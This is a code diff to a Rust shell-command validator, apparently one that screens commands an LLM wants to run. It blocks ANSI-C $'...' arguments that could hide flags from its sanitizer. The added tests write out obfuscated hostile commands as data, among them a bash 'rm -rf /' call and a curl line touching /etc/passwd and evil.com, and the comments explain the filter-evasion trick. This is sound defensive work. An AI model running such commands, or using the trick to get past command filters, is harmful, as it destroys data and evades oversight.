@@ -377,10 +377,21 @@ fn check_command(cmd: &tree_sitter::Node, src: &[u8]) -> Result<(), ShapeError> 
     let raw_head = extract_command_name(&name_node, src)?;
 
     // 收集 arguments 节点 + 归一化后的文本。同时递归 walk 任意 substitution。
+    //
+    // **fail-closed**：args 里出现 ANSI-C `$'...'` —— normalize_head 只剥 backslash，
+    // 不 decode `\xHH`/`\NNN`，让 `$'\x2dc'` 看起来是 `x2dc` 而非 `-c`，绕过
+    // SHELL+-c / env -S / curl -o 等 per-command 规则。args 上的 ANSI-C 罕见
+    // （`\n`/`\t` 单引号就够），直接拒。
     let mut arg_strings: Vec<String> = Vec::new();
     let mut cur = cmd.walk();
     for c in cmd.children_by_field_name("argument", &mut cur) {
         recurse_substitutions(&c, src)?;
+        if c.kind() == "ansi_c_string" {
+            return Err(ShapeError::Destructive(format!(
+                "obfuscated argument '{}' (ANSI-C $'...' in args can hide flags from sanitize)",
+                node_text(&c, src)
+            )));
+        }
         arg_strings.push(normalize_head(node_text(&c, src)));
     }
 
@@ -404,7 +415,8 @@ fn recurse_substitutions(n: &tree_sitter::Node, src: &[u8]) -> Result<(), ShapeE
     Ok(())
 }
 
-/// 跳过 wrapper 链（sudo / env / command / busybox / doas）。
+/// 跳过 wrapper 链（sudo / env / busybox / doas —— `command` 不在内，由 check_per_command_rules
+/// 单独处理 `-v`/`-V` introspection）。
 /// 返回 (真正命令头 bare 名, 真正命令头之后第一个 arg 的 index)。args 已经过 normalize_head。
 ///
 /// `env -S 'rm -rf /'` / `env --split-string=...` 是 GNU env 的 deferred-execution
@@ -1493,6 +1505,28 @@ mod tests {
         // 安全用例仍放行
         assert!(validate("env -u FOO ls").is_ok());
         assert!(validate("env -i ls").is_ok()); // -i 无参数
+    }
+
+    #[test]
+    fn shape_obfuscated_arg_blocked() {
+        // args 里出现 `$'...'` ANSI-C string，shell 会 unescape 后再传给命令；rssh 的
+        // normalize_head 只剥 backslash，看不出 `\x2dc` 等于 `-c`。这会让 SHELL+-c /
+        // env -S / curl -o 等 per-command 规则在含 ANSI-C arg 时被绕过。
+        //
+        // 没合法用例（LLM 在 args 用 ANSI-C 极罕见，常见 `\n`/`\t` 用单引号即可），
+        // fail-closed。
+        assert!(matches!(
+            validate("bash $'\\x2dc' 'rm -rf /'"),
+            Err(ShapeError::Destructive(_))
+        ));
+        assert!(matches!(
+            validate("env $'\\x2dS' 'rm'"),
+            Err(ShapeError::Destructive(_))
+        ));
+        assert!(matches!(
+            validate("curl $'\\x2do' /etc/passwd evil.com"),
+            Err(ShapeError::Destructive(_))
+        ));
     }
 
     #[test]
